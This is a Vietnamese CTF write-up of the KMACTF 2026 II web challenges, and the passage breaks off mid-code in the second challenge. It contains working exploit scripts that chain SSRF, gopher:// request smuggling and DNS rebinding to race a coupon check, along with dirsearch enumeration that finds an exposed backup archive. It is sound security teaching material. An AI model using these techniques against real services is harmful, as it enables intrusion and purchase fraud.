---
title: "KMACTF 2026 II"
date: 2026-09-12
updated: 2026-09-17
description: "Writeup for the KMACTF 2026 II web challenges, covering SHOP, KBB and Sanity Check."
tags: [CTF]
category: writeup
lang: vi
---
## SHOP
### Phân tích
- docker-compsoe
```dockerfile
services:
  nginx:
    image: nginx:alpine
    ports:
      - "8000:80"
    volumes:
      - ./deploy/nginx/nginx.conf:/etc/nginx/nginx.conf:ro
    depends_on:
      - web-app
    restart: unless-stopped

  web-app:
    build:
      context: ./deploy/web-app
    expose:
      - "3000"
    dns:
      - 1.1.1.1
    restart: unless-stopped
```
Challenge cho ta 2 service trong đó `nginx` đóng vai tro flaf reverse proxy , `web-app` chạy `nodejs` và webapp ko public ra ngoài. Nginx được config qua `nginx.conf`
```config
user nginx;
worker_processes auto;
events { worker_connections 1024; }

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 65;
    client_max_body_size 1m;

    limit_req_zone  $binary_remote_addr zone=coupon_req:10m  rate=1r/s;
    limit_conn_zone $binary_remote_addr zone=coupon_conn:10m;
    limit_req_zone  $binary_remote_addr zone=vendor_req:10m  rate=1r/s;
    limit_conn_zone $binary_remote_addr zone=vendor_conn:10m;
    limit_req_zone  $binary_remote_addr zone=general:10m     rate=30r/s;
    limit_req_status  429;
    limit_conn_status 503;

    upstream webapp { server web-app:3000; }

    server {
        listen 80;
        server_name _;

        limit_req zone=general burst=60 nodelay;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;                         #get real IP
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location = /health {
            default_type application/json;
            return 200 '{"status":"ok"}';
        }

        location ~* ^/(order|purchase)/[^/]+/apply {    #rate limit site order/purchase
            limit_req  zone=coupon_req burst=1 nodelay;
            limit_conn coupon_conn 1;
            proxy_pass http://webapp;
        }

        location ~* ^/webhook {
            limit_req  zone=vendor_req burst=1 nodelay;
            limit_conn vendor_conn 1;
            proxy_pass http://webapp;
        }

        location / {
            proxy_pass http://webapp;
        }
    }
}
```
- Dockerfile
```dockerfile!
FROM node:20-bookworm-slim

ENV USER=appuser
ENV PORT=3000

RUN adduser --disabled-password --gecos "" $USER && \
    apt-get update && \
    apt-get install -y --no-install-recommends curl sqlite3 ca-certificates && \
    rm -rf /var/lib/apt/lists/* && apt-get clean

WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
COPY ./flag.txt /flag.txt
COPY ./readflag /readflag
RUN chmod +x /readflag && \
    chown root:root /flag.txt /readflag && \
    chmod 400 /flag.txt && chmod 4755 /readflag && \
    chmod +x ./entrypoint.sh && chown -R $USER:$USER /app
EXPOSE $PORT
USER $USER
ENTRYPOINT ["./entrypoint.sh"]
CMD ["node", "server.js"]
```
Server chạy nodejs cũng như flag read qua `/readflag` -> có thể phải RCE , ngoài ra database là sqlite3
- `package.json`
```jsonld
{
  "name": "store",
  "version": "2.0.0",
  "description": "Store",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "express": "^4.18.2",
    "jsonwebtoken": "^9.0.2",
    "sqlite-async": "^1.1.3",
    "uuid": "^9.0.1"
  }
}
```
Ở đây có một vài dependencies như `jsonwebtoken` hỗ trợ tạo token user,`express` hỗ trợ server nodejs, database `sqlite`
Phần server.js cho ta môt số thông tin
![image](/research/kmactf-2026-ii/BkW-Kh7tzl.png)
web-server chạy port 3000 và có một số route trên
Tại `db.js`
```javascript!
const START_BALANCE = 50;        # số dư
const COUPON_CODE = "KMACTF";    #voucher price
const COUPON_AMOUNT = 50;
const FLAG_PRICE = 1000;          #flag price

class StoreDB {
  constructor(file) {
    this.file = file;
    this.db = null;
  }
  async connect() {
    this.db = await Database.open(this.file);
  }
  async seed() {
    await this.db.exec(`
      DROP TABLE IF EXISTS users;
      CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username VARCHAR(128) UNIQUE NOT NULL,
        password VARCHAR(128) NOT NULL,
        email VARCHAR(128) NOT NULL,
        address VARCHAR(255) NOT NULL,
        balance DOUBLE NOT NULL DEFAULT 0,
        discount DOUBLE NOT NULL DEFAULT 0,
        discount_pid INTEGER NOT NULL DEFAULT 0,
        coupon_code VARCHAR(128) NOT NULL DEFAULT '',
        coupon_used TINYINT NOT NULL DEFAULT 0
      );
      DROP TABLE IF EXISTS products;
      CREATE TABLE products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title VARCHAR(128) NOT NULL,
        image VARCHAR(128) NOT NULL,
        price DOUBLE NOT NULL,
        is_flag TINYINT NOT NULL
      );
      DROP TABLE IF EXISTS vouchers;
      CREATE TABLE vouchers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        code VARCHAR(128) UNIQUE NOT NULL,
        label VARCHAR(128) NOT NULL,
        amount DOUBLE NOT NULL,
        is_admin TINYINT NOT NULL
      );
      INSERT INTO users (username,password,email,address,balance,coupon_code,coupon_used)
        VALUES ('guest','guest','guest@skinvault.local','Inventory Slot 1',${START_BALANCE},'${COUPON_CODE}',0);                     #user gest
      INSERT INTO products (title,image,price,is_flag) VALUES ('Legendary Skin (VIP)','/static/img/legendary.svg',${FLAG_PRICE},1);
      INSERT INTO products (title,image,price,is_flag) VALUES ('Common Skin','/static/img/common.svg',20,0);
      INSERT INTO products (title,image,price,is_flag) VALUES ('Rare Skin','/static/img/rare.svg',35,0);
      INSERT INTO products (title,image,price,is_flag) VALUES ('Epic Skin','/static/img/epic.svg',25,0);
      INSERT INTO vouchers (code,label,amount,is_admin) VALUES ('${COUPON_CODE}','welcome',${COUPON_AMOUNT},0);
    `);
  }
```
Phần database này cho ta khá nhiều thông tin cũng như logic của chall , lúc đầu mình nghĩ cần RCE nhưng có vẻ đây là dạng bài mua flag -> cùng với việc ko có admin nên ta có thể nghĩ đến ngay race condition , nhưng bị rate limit theo ip , ta có thể cần bypass gì đó

Ta sẽ xem thêm phần `middleware`
![image](/research/kmactf-2026-ii/Hy7vo2QKMx.png)
Đây là phần để xác thực valid token từ user, rất cần thiết để tránh unauth
![image](/research/kmactf-2026-ii/Sk_LnnXFfg.png)
Flag nằm trong món giá cao nhất , với việc được read qua `/readflag`
Tại đây có một hint khá rõ từ author tại hàm áp voucher, cụ thể
```javascript!
  router.post("/:id/apply", requireAuth, async (req, res) => {
    const pid = req.params.id;
    const username = req.user.name;
    const code = (req.body.coupon || "").trim();
    const user = await db.fetchUser(username);
    if (!user) return res.redirect("/login");
    const product = await db.fetchProduct(pid);
    if (!product) return res.status(404).send("Invalid product");
    const voucher = code ? await db.fetchVoucher(code) : null;
    if (!voucher || user.coupon_code !== code) {
      return renderCheckout(res, product, user, "Coupon not found.", true);
    }
    if (user.coupon_used === 1) {
      return renderCheckout(res, product, user, "Coupon already used.", true);
    }
    await delay(PAYMENT_SETTLE_MS);    // PAYMENT_SETTLE_MS = 250
    await db.increaseDiscount(username, voucher.amount, pid);
    await db.markVoucherUsed(username);
    const updatedUser = await db.fetchUser(username);
    return renderCheckout(res, product, updatedUser, `Applied! ${voucher.amount} coin off the item price (${Math.max(0, product.price - updatedUser.discount)} coin left to pay).`);
  });
```
### Race Condition
flow diễn ra như sau
```
check voucher -> sleep 250 ms-> update database
```
rõ ràng đây là race condition với `TOCTOU` -> nhưng đang bị nginx rate limit, tạm thời ta cần đi tìm một gadget khác
- `webhook.js` là một route để fetch url qua tham số `callbackUrl`
```javascript!
router.post("/send", requireAuth, async (req, res) => {
    const callbackUrl = (req.body.callbackUrl || req.body.url || "").trim();
    if (!callbackUrl) return res.status(400).json({ ok: false, error: "missing callbackUrl" });
    try {
      const raw = await curlFetch(callbackUrl);
      return res.json({ ok: true, response: raw.slice(0, 2000) });
    } catch (e) {
      return res.status(502).json({ ok: false, error: String(e.message).slice(0, 200) });
    }
  });
```
Đây chính là gadget khá phù hợp vì `SSRF` qua web-app sẽ bypass được rate limit của nginx
Vấn đề hiện tại là ta cần biết server sẽ handle tham số này như nào tai `fetcher.js`
```javascript!
function isInternalIp(ip) {
  if (!ip) return true;
  if (ip.includes(":")) {
    const v = ip.toLowerCase();
    return v === "::1" || v === "::" || v.startsWith("fe80") || v.startsWith("fc") || v.startsWith("fd");
  }
  const o = ip.split(".").map(Number);
  if (o.length !== 4 || o.some(n => Number.isNaN(n))) return true;
  if (o[0] === 0 || o[0] === 127) return true;
  if (o[0] === 10) return true;
  if (o[0] === 172 && o[1] >= 16 && o[1] <= 31) return true;
  if (o[0] === 192 && o[1] === 168) return true;
  if (o[0] === 169 && o[1] === 254) return true;
  return false;
}
```
Trước hết ta thấy hàm check internal ip khá là chặt từ ipv4,ipv6 cho đến những internal ip, nhưng có điểm yếu là chỉ check 2 phân đoạn đầu  thông qua dấu '.'
```javascript!
async function curlFetch(url) {
  if (!url || typeof url !== "string") throw new Error("Invalid url");

  const trimmed = url.trim();
  if (trimmed.toLowerCase().startsWith("file:")) {
    throw new Error("file:// scheme is blocked");
  }

  let parsed;
  try { parsed = new URL(trimmed); } catch { throw new Error("Invalid url"); }

  let addr;
  try { addr = (await dns.lookup(parsed.hostname)).address; }
  catch { throw new Error("host resolution failed"); }
  if (isInternalIp(addr)) throw new Error("internal address blocked");

  return new Promise((resolve, reject) => {
    const args = ["-s", "-L", "--max-time", "4", trimmed];
    const child = spawn("curl", args, { timeout: 5000 });

    let stdout = "";
    let stderr = "";
    let killed = false;

    const timer = setTimeout(() => {
      killed = true;
      child.kill("SIGKILL");
      reject(new Error("curl timeout"));
    }, 5000);

    child.stdout.on("data", (d) => { stdout += d.toString(); });
    child.stderr.on("data", (d) => { stderr += d.toString(); });

    child.on("error", (e) => {
      clearTimeout(timer);
      reject(e);
    });

    child.on("close", (code) => {
      clearTimeout(timer);
      if (killed) return;
      if (code !== 0 && !stdout) {
        return reject(new Error(stderr || `curl exit ${code}`));
      }
      resolve(stdout);
    });
  });
}
```
Hàm curlFetch này ta thấy chỉ block hardcore `file` protocol , spawn curl với tham số `-s` `-L` , lúc đầu mình đã tưởng đây là hướng ssrf chính với việc bypass qua `http redirect` vì curl có tham số -L

Mình đã thử setup với python hỗ trợ chuyển  hướng và ngrok để bypass filter
```python!
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        target_url = "https://www.example.com"
        self.send_response(301)
        self.send_header('Location', target_url)
        self.end_headers()

if __name__ == "__main__":
    port = 7000
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
        
    server = HTTPServer(("", port), RedirectHandler)
    print(f"Redirecting to {target_url} on port {port}")
    server.serve_forever()    
```
- ngrok
```cmd!
ngrok http 7000
```
![image](/research/kmactf-2026-ii/BJpZGaXFGl.png)
Mình đã thành công bypass filter nhưng vấn đề xuất hiện là nó chỉ trả form login, ta chỉ có thể gửi được GET request , ko thể gửi body.
Suy nghĩ một hồi khá lâu thì mình thấy có lẽ cần để ý lại chỗ server chỉ block cheme `file://` chứ ko filter kiểu chỉ cho phép `http/https` đây là điểm đáng ngờ , có vẻ author hint ta cần sử dụng other protocol
Tìm kiếm thì em thấy tại [SSRF Advantage Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation.md) có một kĩ thuật là sử dụng `gopher://` đây là protocol cổ đại , có thể gửi raw request -> khá phù hợp vì ta ko thể sử dụng post để gửi body.
Lúc này flow của em là
```bash!
gopher:// đến webapp -> race với nhiều gói tin để Áp 19 voucher -> buy flag
```

Nhưng lại có thêm vấn đề nữa là việc bypass filter , ta không thể kết hợp gopher với ngrok được vì TLS (ngrok dùng https) nên ta cần tìm một cách bypass khác.
Mình nhớ ra còn chưa động đến DNS rebinding kĩ thuật này yêu cầu server cần 2 lần phân giải domain, và tại `fetcher.js`
![image](/research/kmactf-2026-ii/rkWlSAmFGg.png)
> Ta sẽ thử với kĩ thuật này 

Với `DNS rebinding utility` qua [1u.ms](http://1u.ms/) ta có thể craft một domain như sau
```
make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms
```
check với nslookup
```
$ nslookup make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms
Name:   make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms
Address: 1.1.1.1

$ nslookup make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms
Name:   make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms
Address: 127.0.0.1
```
### Gopher protocol
Giả sử ta có một POST http request
```http!
POST /admin HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=admin
```
Khi chuyển sang Gopher
```
gopher://127.0.0.1:80/_POST /admin HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=admin
```
### Exploit
Ta cần encode và phân tách Header với Body bằng CRLF (%0D%0A)
![image](/research/kmactf-2026-ii/HJNoMyEtfe.png)
Trên burp suite ta thực hiện bắt một request để craft
```gopher!
POST /order/1/apply HTTP/1.1
Host: localhost:8000
Content-Length: 13
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost:8000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8000/order/1
Accept-Encoding: gzip, deflate, br
Cookie: username=; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImlzTG9naW4iOnRydWUsImlhdCI6MTc4OTI4NjUxMH0.mVWsOTHAWEPB8mN8DpsgK_SzZgmDXHtgBxtEMG6vLF0
Connection: keep-alive

coupon=KMACTF
```
Sau đó ta dùng tool [này](https://github.com/fuzzlove/GopherSSRF.git) để convert sang gopher để có script

```python
import urllib.parse
N = 20

# The GET and POST request will be modified to match the target site.
# Get request Gopher payload -> Make sure you update the GET request
GETrequest = \
"""GET / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
"""

# POST request Gopher payload -> Make sure you update the POST request
POSTrequest = \
"""POST /order/1/apply HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImlzTG9naW4iOnRydWUsImlhdCI6MTc4OTI4NjUxMH0.mVWsOTHAWEPB8mN8DpsgK_SzZgmDXHtgBxtEMG6vLF0

coupon=KMACTF
"""
raw = (POSTrequest * N).encode()
ans=True
while ans:
    print ("""

  /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$$       /$$$$$$$                                                      /$$
 /$$__  $$ /$$__  $$| $$__  $$| $$_____/      | $$__  $$                                                    | $$ 
| $$  \__/| $$  \__/| $$  \ $$| $$            | $$  \ $$  /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$$ /$$$$$$   /$$$$$$$
|  $$$$$$ |  $$$$$$ | $$$$$$$/| $$$$$         | $$$$$$$/ /$$__  $$ /$$__  $$| $$  | $$ /$$__  $$ /$$_____/|_  $$_/  /$$_____/
 \____  $$ \____  $$| $$__  $$| $$__/         | $$__  $$| $$$$$$$$| $$  \ $$| $$  | $$| $$$$$$$$|  $$$$$$   | $$   |  $$$$$$
 /$$  \ $$ /$$  \ $$| $$  \ $$| $$            | $$  \ $$| $$_____/| $$  | $$| $$  | $$| $$_____/ \____  $$  | $$ /$$\____  $$
|  $$$$$$/|  $$$$$$/| $$  | $$| $$            | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/|  $$$$$$$ /$$$$$$$/  |  $$$$//$$$$$$$/
 \______/  \______/ |__/  |__/|__/            |__/  |__/ \_______/ \____  $$ \______/  \_______/|_______/    \___/ |_______/
                                                                        | $$
                                                                        | $$                                 By: Liquidsky
                                                                        |__/
                               ~-( SSRF... HTTP based (GET/POST) gopher requests. )-~  - H4xing Tool
""")
    print ("""
    1. Gopher GET Request
    2. Gopher POST Request
    """)
    ans=input("[*] Please select GET (1) or POST (2) request: ")
    if ans=="1":
      print("[x] Gopher GET Request: ")

      tmp = urllib.parse. quote(GETrequest)
      new = tmp.replace('%0A','%0D%0A' )
      result = 'gopher://localhost:80/'+'_'+ new
      print (result)
      print
      print ("[!] Cheers m8, Press [Enter] to Exit ^_~")

    elif ans=="2":
      print("[?] Informational: The four HTTP headers above are required for POST requests, namely POST, Host, Content-Type and Content-Length. If it is missing, an error will be reported, but GET does not use it.")
      print("[x] Gopher POST Request: ")
      tmp = urllib.parse. quote(raw)
      new = tmp.replace('%0A','%0D%0A' )
      result = 'gopher://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms:3000/'+'_'+ new
      print (result)
      print
      print ("[!] Cheers m8, Press [Enter] to Exit ^_~")
    elif ans !="":
      print("[!] Not Valid Choice Try again")
      print("[?] Press CTRL+C or Enter to exit")
```
Ở đây mình đã sửa chút để x20 request lên vì gopher gửi dc `raw TCP stream` chứ ko phải chờ response
Hoặc có thể dùng script này để tránh việc copy lỗi
```python!
import urllib.parse
import requests

REBIND_HOST  = "make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms"
TARGET_PORT  = 3000
TARGET_PATH  = "/order/1/apply"
BODY         = "coupon=KMACTF"
COOKIE       = "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpc0xvZ2luIjp0cnVlLCJpYXQiOjE3ODkyOTA4OTl9.1D3Wz17qA357f5cy9QVEHYImPyl5x5Qp-DmXXjPZimg"
N            = 19      

one_req = (
    f"POST {TARGET_PATH} HTTP/1.1\r\n"
    f"Host: localhost\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(BODY)}\r\n"
    f"Cookie: {COOKIE}\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{BODY}"
)

raw = (one_req * N).encode()

encoded = urllib.parse.quote(raw, safe="")

gopher_url = f"gopher://{REBIND_HOST}:{TARGET_PORT}/_{encoded}"

print(f"[*] gopher URL length: {len(gopher_url)}")
if len(gopher_url) > 7500:
    print("[!] URL quá dài, giảm N")

resp = requests.post(
    "http://67.223.119.69:30000/webhook/send",
    data={"callbackUrl": gopher_url},
    headers={"Cookie": COOKIE},
    timeout=10,
)
print(f"[*] status: {resp.status_code}")
print(f"[*] body: {resp.text[:500]}")
```

![image](/research/kmactf-2026-ii/BklIckVFGx.png)

![image](/research/kmactf-2026-ii/SkL55k4YGl.png)
### **References**
- https://github.com/fuzzlove/GopherSSRF
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation.md 
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-dns-rebinding
## KBB
### Phân tích
![image](/research/kmactf-2026-ii/S1fKTqrKzg.png)
Đây là một chall cho phép sử dụng LLM/ blackbox

![image](/research/kmactf-2026-ii/rks06qrFze.png)
Khi vào game , mình thử đặt là admin nhưng ko take account của admin thật với 1m points. Thử chơi vài ván thì mình chưa thấy có gì đặc biệt. Mình ko hiểu sao burp suite ko bắt được request chỉ khi sử dụng web thường mới xem được chall `No local random or HTTP fallback is used`
Mình thử sử dụng curl để xem response 
```curl!
linux@DESKTOP-81QF8E8:/mnt/c/Users/Admin'$ curl -k https://chall.kcsc.vn:9007/
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport"
      content="width=device-width,initial-scale=1,viewport-fit=cover" />
    <meta name="theme-color" content="#f4e5bd" />
    <title>Rock • Paper • Scissors — Classic Hand Game</title>
    <link rel="stylesheet" href="./style.css" />
    <link
      rel="preload"
      href="/pkg/r/r06f6a0209cf1f2c5ab6a_bg.wasm"
      as="fetch"
      type="application/wasm"
      integrity='sha384-xJfxv43fG3B/S30lSOwhm9kEkg1xY1GBirRZf02yooC93Nv+FfzeGTS07XbyTuVD'
      crossorigin="anonymous"
    />
  </head>
  <body>
    <canvas
      id="game"
      aria-label="Rock Paper Scissors Game"
      data-c0="https://chall.kcsc.vn:9007/"
      data-c1="b8b50c38573fdc7b6c3a29a91a8df707cca69a43de0f12eeca9dde99eb31ed49"
    ></canvas>
    <script
      type="module"
      src="./bootstrap.js"
      integrity="sha384-3ZueYYCEWbW3jlUyexgguKhJAQxsRHy7gRHTBAXq1vEiM8dispn0wWGxhrCd4/jQ"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
```
Ta thu thập được một số thông tin game đang dc chạy bằng `wasm` cũng như có một file `/bootstrap.js`. Ngoài ra ta còn có một mã băm khá dài 64 char , chưa biết để làm gì
```bash!
data-c1="b8b50c38573fdc7b6c3a29a91a8df707cca69a43de0f12eeca9dde99eb31ed49"
```
#### /backup.zip
Trong lúc đang phân vân xem có nên reverse lại file assembly để xem cách game vận hành ko thì theo bản năng đấm blackbox khi bí thông tin ta sẽ `dirsearch`
```dirsearch!
linux@DESKTOP-81QF8E8:/mnt/c/Users/Admin'$ dirsearch -u https://chall.kcsc.vn:9007/ -t 150 -x 400,403,404,500,502,503 --
timeout 3 --retries 0
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 150 | Wordlist size: 11460

Output File: /mnt/c/Users/Admin'/reports/https_chall.kcsc.vn_9007/__26-09-14_23-13-46.txt

Target: https://chall.kcsc.vn:9007/

[23:13:46] Starting:
[23:13:58] 200 -   23KB - /backup.zip

Task Completed
```
Và wow server có để lộ file `backup.zip` có lẽ đây mới chính là đường để lấy flag chứ ko phải cái file assembly kia. Tiến hành giải nén, mình nhận ra backed được viết bằng `TypeScript` với DOM
```tree!
C:.
│   admin_redis.ts
│   cert.ts
│   config.ts
│   game_store.ts
│   jwt.ts
│   main.ts
│   protocol.ts
│   redis.ts
--- webtransport.ts
```
Nhìn sơ qua ta có thể thấy server sử dụng giao thứ riêng là `WebTransport` , dbms là `redis` ngoài ra còn có `admin` cũng như `jwt_token` -> có vẻ ta sẽ phải lên admin để lấy flag
Ta sẽ đọc `main.ts` trước để xem tổng quan cũng như xem các entrypoint
```typescript!
import {
  ensureCertificate,
  errorText,
  normalizeCertificateHostname,
  printCertificateExpiryWarning,
} from "./cert.ts";
import { dirname } from "node:path";
import { loadConfig, loadPresharedKey } from "./config.ts";
import { GameStoreProvider } from "./game_store.ts";
import { signJwt } from "./jwt.ts";
import { serveWebTransportConnections } from "./webtransport.ts";

const ADMIN_JWT_OUTPUT = "./admin.jwt";
const config = loadConfig();
const presharedKey = await loadPresharedKey();
const certificateHostname = normalizeCertificateHostname(
  config.certificateHostname,
);
const certificate = await ensureCertificate(certificateHostname);
if (config.pinOutputPath !== undefined) {
  await publishCertificatePin(
    config.pinOutputPath,
    certificate.info.sha256Hex,
  );
}
const adminToken = await signJwt({
  admin: true,
  iat: Math.floor(Date.now() / 1_000),
});
await Deno.writeTextFile(ADMIN_JWT_OUTPUT, `${adminToken}\n`, {
  create: true,
  mode: 0o600,
});
const adminJwtMirror = Deno.env.get("ADMIN_JWT_MIRROR")?.trim();
if (adminJwtMirror !== undefined && adminJwtMirror.length > 0) {
  await Deno.mkdir(dirname(adminJwtMirror), { recursive: true, mode: 0o700 });
  await Deno.writeTextFile(adminJwtMirror, `${adminToken}\n`, {
    create: true,
    mode: 0o600,
  });
}
```
- Phần đầu cho ta thấy trước hết `adminToken` được khỏi tạo thông qua hàm `signJwt` được import từ `/jwt.ts` và được ghi vào `/admin.jwt`
- Ngoài ra server có tạo thêm mã băm `sha256Hex` qua hàm `publishCertificatePin` grep thêm xuống dưới ta xem rõ hơn về hàm này
- ![image](/research/kmactf-2026-ii/HJ_8SsrYfl.png)
Hàm này cho ta thấy việc mã băm `sha256` được ghi vào `tmp...` và cuối cùng là vào tệp đích. Và mã băm này cũng vừa đủ 64 char -> có vẻ đây là `data-c1` mà ta mới nhắc ở trên
- ![image](/research/kmactf-2026-ii/rJ1jUoSFfg.png)
Đây là phần khởi tạo server với listener tại `HTTP/3` cũng như giao thức `WebTransportError` bên `/webtransport.ts`

Ta cần thêm thông tin bên `webtransport.ts`
```typescript!
export async function serveWebTransportConnections(
  listener: AsyncIterable<Deno.QuicIncoming>,
  store: GameStoreProvider,
  redisUrl: string,
  presharedKey: string,
): Promise<void> {
  for await (const incoming of listener) {
    const connectionId = nextConnectionId++;
    void acceptConnection(
      incoming,
      connectionId,
      store,
      redisUrl,
      presharedKey,
    );
  }
}
```
Hàm này cho ta biết server sử dụng `QUIC + WebTransport` 
Tiếp theo ta thấy 2 route và có một route đáng chú ý là `/admin/redis-cmd`
```typescript!
async function acceptConnection(
  incoming: Deno.QuicIncoming,
  connectionId: number,
  store: GameStoreProvider,
  redisUrl: string,
  presharedKey: string,
): Promise<void> {
  try {
    const connection = await incoming.accept();
    const remoteAddress = formatAddress(connection.remoteAddr);
    const transport = await Deno.upgradeWebTransport(connection);
    await transport.ready;

    const requestUrl = new URL(transport.url);
    const pathname = requestUrl.pathname;

    console.log(
      `[connection ${connectionId}] WebTransport connected: ${remoteAddress}; path=${pathname}`,
    );

    if (pathname === "/admin/redis-cmd") {    <<------------------
      await serveAdminRedisStreams(transport, redisUrl, connectionId);
      return;
    }
    if (pathname !== "/") {
      transport.close({
        closeCode: 4004,
        reason: "unsupported WebTransport path",
      });
      return;
    }

    void transport.closed.then(
      () => console.log(`[connection ${connectionId}] connection closed`),
      (error) =>
        console.warn(
          `[connection ${connectionId}] connection closed with error: ${
            errorText(error)
          }`,
        ),
    );

    const context: ConnectionContext = {
      id: connectionId,
      remoteAddress,
      issuedGames: new Map(),
      randomLimiter: new SlidingWindowRateLimiter(
        RANDOM_REQUESTS_PER_SECOND,
        1_000,
      ),
      store,
      player: undefined,
    };
    await serveBidirectionalStreams(transport, context, presharedKey);
  } catch (error) {
    console.warn(
      `[connection ${connectionId}] connection attempt failed before/while establishing the application session: ${
        errorText(error)
      }`,
    );
  }
}
```
route `/admin/redis-cmd` require `serveAdminRedisStreams` nằm bên `admin_redis.ts` tí nữa ta sẽ qua sau
- ![image](/research/kmactf-2026-ii/BJE1KoHtzl.png)
Ở đây ta thấy player được xác địnhq qua ID và name, hàm `serveWebTransportConnections` cho ta thấy có mộ `presharedKey` mỗi connect dùng để auth mỗi `gameStream`
Ngoài ra còn có một hàm xử lí message của client sau khi đi qua tất cả các bước điểm duyệt PSK
```typescript
async function handleClientMessage(
  message: ClientMessage,
  context: ConnectionContext,
): Promise<ServerMessage> {
  switch (message.type) {
    case "identify_player": {
      const identity = {
        playerId: message.playerId,
        name: message.name,
      } satisfies PlayerIdentity;
      context.player = identity;
      const token = await signJwt({
        admin: false,
        playerId: identity.playerId,
        name: identity.name,
        iat: Math.floor(Date.now() / 1_000),
      });

      try {
        const profile = await context.store.identifyPlayer(
          identity.playerId,
          identity.name,
          new Date().toISOString(),
        );
        console.log(
          `[connection ${context.id}] player identified: ${identity.name} (${identity.playerId})`,
        );
        return {
          type: "player_identified",
          profile,
          storageAvailable: true,
          token,
        };
      } catch (error) {
        console.warn(
          `[connection ${context.id}] player profile unavailable; gameplay will continue: ${
            errorText(error)
          }`,
        );
        return {
          type: "player_identified",
          profile: emptyProfile(identity),
          storageAvailable: false,
          token,
        };
      }
    }

    case "start_game": {
      if (context.player === undefined) {
        return {
          type: "protocol_error",
          code: "player_required",
          message: "Identify a player before starting a game.",
        };
      }
      if (context.issuedGames.size >= MAX_GAMES_PER_CONNECTION) {  //MAX_GAMES_PER_CONNECTION = 250
        return {
          type: "protocol_error",
          code: "too_many_games",
          message: "This connection has started too many games.",
        };
      }
      const gameId = crypto.randomUUID();
      context.issuedGames.set(gameId, context.player);
      console.log(
        `[connection ${context.id}] game started: ${gameId}; player=${context.player.name}`,
      );
      return { type: "game_started", gameId };
    }

    case "get_random": {
      if (!context.randomLimiter.allow(Date.now())) {
        return {
          type: "protocol_error",
          code: "random_rate_limited",
          message:
            `At most ${RANDOM_REQUESTS_PER_SECOND} random requests per second are allowed.`,
        };  //RANDOM_REQUESTS_PER_SECOND = 20
      }

      const value = Math.random();
      console.log(
        `[connection ${context.id}] Math.random() requestId=${message.requestId} value=${value}`,
      );
      return { type: "random", requestId: message.requestId, value };
    }

    case "submit_score": {
      const identity = context.issuedGames.get(message.gameId);
      if (identity === undefined) {
        return {
          type: "score_error",
          gameId: message.gameId,
          message: "gameId was not issued on this WebTransport connection.",
          retryable: false,
        };
      }

      try {
        const saved = await context.store.submitScore({
          gameId: message.gameId,
          playerId: identity.playerId,
          playerName: identity.name,
          score: message.score,
          roundsPlayed: message.roundsPlayed,
          reason: message.reason,
          timestamp: new Date().toISOString(),
          remoteAddress: context.remoteAddress,
        });
        console.log(
          `[connection ${context.id}] score ${
            saved.created ? "saved" : "already saved"
